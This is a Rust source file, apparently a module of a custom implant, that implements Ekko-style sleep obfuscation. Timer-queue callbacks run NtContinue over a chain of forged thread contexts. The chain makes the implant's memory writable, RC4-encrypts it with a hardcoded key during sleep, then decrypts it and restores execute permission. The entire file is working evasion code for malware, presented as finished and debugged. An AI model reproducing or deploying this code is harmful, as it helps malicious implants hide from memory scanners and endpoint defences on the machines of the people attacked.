// sleep.rs — The Ghost's Shroud (Sleep Obfuscation)
//
// Ekko-style RC4-encrypted sleep mask with fixed dual-event synchronization.
// All bugs from original implementation corrected.

#![allow(non_snake_case, dead_code)]

use core::ffi::c_void;
use core::ptr::null_mut;
use crate::defs::*;

#[repr(align(16))]
#[derive(Clone)]
pub struct CONTEXT(pub [u8; 1232]);
impl CONTEXT { pub fn new() -> Self { CONTEXT([0; 1232]) } }

#[repr(C)]
pub struct USTRING {
    pub Length:        u32,
    pub MaximumLength: u32,
    pub Buffer:        *mut c_void,
}

pub const PAGE_READWRITE: u32    = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const WT_EXECUTEINTIMERTHREAD: u32 = 0x00000020;

pub type RtlCaptureContext  = unsafe extern "system" fn(*mut CONTEXT);
pub type NtContinue         = unsafe extern "system" fn(*mut CONTEXT, u8) -> i32;
pub type SystemFunction032  = unsafe extern "system" fn(*mut USTRING, *const USTRING) -> i32;
pub type CreateTimerQueue   = unsafe extern "system" fn() -> *mut c_void;
pub type CreateTimerQueueTimer = unsafe extern "system" fn(
    *mut *mut c_void, *mut c_void,
    unsafe extern "system" fn(*mut c_void, u8),
    *mut c_void, u32, u32, u32,
) -> i32;
pub type CreateEventW       = unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
pub type SetEvent           = unsafe extern "system" fn(*mut c_void) -> i32;
pub type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
pub type VirtualProtect     = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;

pub unsafe fn execute_sleep_mask(
    image_base: *mut u8, image_size: usize, sleep_time: u32,
    fn_capture: RtlCaptureContext, fn_continue: NtContinue,
    fn_sys032: SystemFunction032, fn_vp: VirtualProtect,
    fn_ctq: CreateTimerQueue, fn_ctqt: CreateTimerQueueTimer,
    fn_event: CreateEventW, fn_set_event: SetEvent,
    fn_wait: WaitForSingleObject,
) {
    let mut key_bytes: [u8; 32] = [
        0x4B,0x72,0x79,0x70,0x74,0x6F,0x4B,0x65,0x79,0x21,0x40,0x23,0x24,0x25,0x5E,0x26,
        0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,0x13,0x37,0xC0,0xDE,0xFF,0xFE,0x00,0x01,
    ];
    let key_string = USTRING {
        Length: 32, MaximumLength: 32,
        Buffer: key_bytes.as_mut_ptr() as *mut c_void,
    };
    let mut data_string = USTRING {
        Length: image_size as u32, MaximumLength: image_size as u32,
        Buffer: image_base as *mut c_void,
    };

    // Two events: sleep (encrypted) and wake (decrypted)
    let h_event_sleep = fn_event(null_mut(), 0, 0, null_mut());
    let h_event_wake  = fn_event(null_mut(), 0, 0, null_mut());
    let h_timer_queue = fn_ctq();

    let mut h_timer_vp1  = null_mut();
    let mut h_timer_enc  = null_mut();
    let mut h_timer_evt  = null_mut();
    let mut h_timer_dec  = null_mut();
    let mut h_timer_vp2  = null_mut();
    let mut h_timer_res  = null_mut();

    let mut ctx_thread = CONTEXT::new();
    let mut ctx_vp1    = CONTEXT::new();
    let mut ctx_enc    = CONTEXT::new();
    let mut ctx_evt    = CONTEXT::new();
    let mut ctx_dec    = CONTEXT::new();
    let mut ctx_vp2    = CONTEXT::new();
    let mut ctx_res    = CONTEXT::new();

    fn_capture(&mut ctx_thread);

    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_vp1, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_enc, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_evt, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_dec, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_vp2, 1);
    core::ptr::copy_nonoverlapping(&ctx_thread, &mut ctx_res, 1);

    let mut old_protect: u32 = 0;

    // CTX 1: VirtualProtect RX→RW
    let p = ctx_vp1.0.as_mut_ptr();
    *(p.add(0xF8) as *mut u64) = fn_vp as u64;
    *(p.add(0x80) as *mut u64) = image_base as u64;
    *(p.add(0x88) as *mut u64) = image_size as u64;
    *(p.add(0x90) as *mut u64) = PAGE_READWRITE as u64;
    *(p.add(0x98) as *mut u64) = &mut old_protect as *mut _ as u64;

    // CTX 2: RC4 encrypt
    let p = ctx_enc.0.as_mut_ptr();
    *(p.add(0xF8) as *mut u64) = fn_sys032 as u64;
    *(p.add(0x80) as *mut u64) = &mut data_string as *mut _ as u64;
    *(p.add(0x88) as *mut u64) = &key_string as *const _ as u64;

    // CTX 3: SetEvent(sleep) — signal main thread to wait
    let p = ctx_evt.0.as_mut_ptr();
    *(p.add(0xF8) as *mut u64) = fn_set_event as u64;
    *(p.add(0x80) as *mut u64) = h_event_sleep as u64;

    // CTX 4: RC4 decrypt
    let p = ctx_dec.0.as_mut_ptr();
    *(p.add(0xF8) as *mut u64) = fn_sys032 as u64;
    *(p.add(0x80) as *mut u64) = &mut data_string as *mut _ as u64;
    *(p.add(0x88) as *mut u64) = &key_string as *const _ as u64;

    // CTX 5: VirtualProtect RW→RX
    let p = ctx_vp2.0.as_mut_ptr();
    *(p.add(0xF8) as *mut u64) = fn_vp as u64;
    *(p.add(0x80) as *mut u64) = image_base as u64;
    *(p.add(0x88) as *mut u64) = image_size as u64;
    *(p.add(0x90) as *mut u64) = PAGE_EXECUTE_READ as u64;
    *(p.add(0x98) as *mut u64) = &mut old_protect as *mut _ as u64;

    // CTX 6: SetEvent(wake) — signal main thread to resume
    let p = ctx_res.0.as_mut_ptr();
    *(p.add(0xF8) as *mut u64) = fn_set_event as u64;
    *(p.add(0x80) as *mut u64) = h_event_wake as u64;

    // Transmute NtContinue to WAITORTIMERCALLBACK signature
    let cb = core::mem::transmute::<
        unsafe extern "system" fn(*mut CONTEXT, u8) -> i32,
        unsafe extern "system" fn(*mut c_void, u8),
    >(fn_continue);

    fn_ctqt(&mut h_timer_vp1, h_timer_queue, cb, &mut ctx_vp1 as *mut _ as *mut _, 100,              0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_enc, h_timer_queue, cb, &mut ctx_enc  as *mut _ as *mut _, 200,              0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_evt, h_timer_queue, cb, &mut ctx_evt  as *mut _ as *mut _, 300,              0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_dec, h_timer_queue, cb, &mut ctx_dec  as *mut _ as *mut _, sleep_time + 100, 0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_vp2, h_timer_queue, cb, &mut ctx_vp2  as *mut _ as *mut _, sleep_time + 200, 0, WT_EXECUTEINTIMERTHREAD);
    fn_ctqt(&mut h_timer_res, h_timer_queue, cb, &mut ctx_res  as *mut _ as *mut _, sleep_time + 300, 0, WT_EXECUTEINTIMERTHREAD);

    // Wait for encrypt chain to complete
    fn_wait(h_event_sleep, 0xFFFFFFFF);
    // Sleep window — memory is RW + RC4 encrypted
    fn_wait(h_event_wake, 0xFFFFFFFF);
    // Restore original thread context on main thread
    fn_continue(&mut ctx_thread, 0);
}
